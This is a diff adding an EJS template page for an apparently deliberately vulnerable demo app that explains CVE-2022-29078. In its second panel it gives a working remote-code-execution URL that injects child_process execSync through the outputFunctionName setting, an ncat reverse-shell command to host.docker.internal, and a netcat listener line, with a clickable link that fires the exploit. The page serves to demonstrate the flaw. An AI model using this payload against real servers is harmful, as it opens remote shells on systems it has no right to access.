@@ -1,0 +1,68 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <%- include('../partials/head'); %>
+</head>
+<body class="container">
+
+<header>
+  <%- include('../partials/header'); %>
+</header>
+<main>
+  <div class="card bg-dark text-white my-3">
+    <img src="/frogbot.png" class="card-img" alt="frogbot is watching you">
+    <div class="card-img-overlay">
+      <h5 class="card-title">CVE-2022-29078 is bad</h5>
+      <p class="card-text">But this is a cool web application...</p>
+    </div>
+  </div>
+  <div class="accordion" id="accordionExample">
+    <div class="card">
+      <div class="card-header" id="headingOne">
+        <h2 class="mb-0">
+          <button class="btn btn-link" type="button" data-toggle="collapse" data-target="#collapseOne" aria-expanded="true" aria-controls="collapseOne">
+            What's the problem with this page ?
+          </button>
+        </h2>
+      </div>
+  
+      <div id="collapseOne" class="collapse show" aria-labelledby="headingOne" data-parent="#accordionExample">
+        <div class="card-body">
+          <p>This page accept a single query parameter "id" and when you provide it, it it used to change the welcome message.</p>
+          <p>For example passing <code>?id=David</code> will display <i>Hello David !</i> at the top of this page.</p>
+          <a href="/?id=David"> Try it !</a>
+        </div>
+      </div>
+    </div>
+    <div class="card">
+      <div class="card-header" id="headingTwo">
+        <h2 class="mb-0">
+          <button class="btn btn-link collapsed" type="button" data-toggle="collapse" data-target="#collapseTwo" aria-expanded="false" aria-controls="collapseTwo">
+            CVE-2022-29078 ?
+          </button>
+        </h2>
+      </div>
+      <div id="collapseTwo" class="collapse" aria-labelledby="headingTwo" data-parent="#accordionExample">
+        <div class="card-body">
+          <p>Now the idea is to exploit CVE-2022-29078 to create a remote shell, by executing the following command in the container<br/>
+          <code>ncat host.docker.internal 1337 -e /bin/bash</code></p>
+          <p>So we will use this url : <br/>
+            <code>http://localhost:3000/?id=David&settings[view%20options][outputFunctionName]=x;process.mainModule.require(%27child_process%27).execSync(%27ncat%20host.docker.internal%201337%20-e%20/bin/bash%27);s</code></p>
+          <p>And before activating the exploit server side, you just need to listen for an incoming connection
+                        <code>nc -l 1337</code></p>
+          </p>
+            <p><a href="/?id=David&settings[view%20options][outputFunctionName]=x;process.mainModule.require(%27child_process%27).execSync(%27ncat%20host.docker.internal%201337%20-e%20/bin/bash%27);s">Try it ! </a></p>
+          </div>
+      </div>
+    </div>
+
+  </div>
+</main>
+
+<footer>
+  <%- include('../partials/footer'); %>
+</footer>
+<script src="/js/jquery-3.6.2.min.js" ></script>
+<script src="/js/bootstrap.bundle.min.js" ></script>
+</body>
+</html>
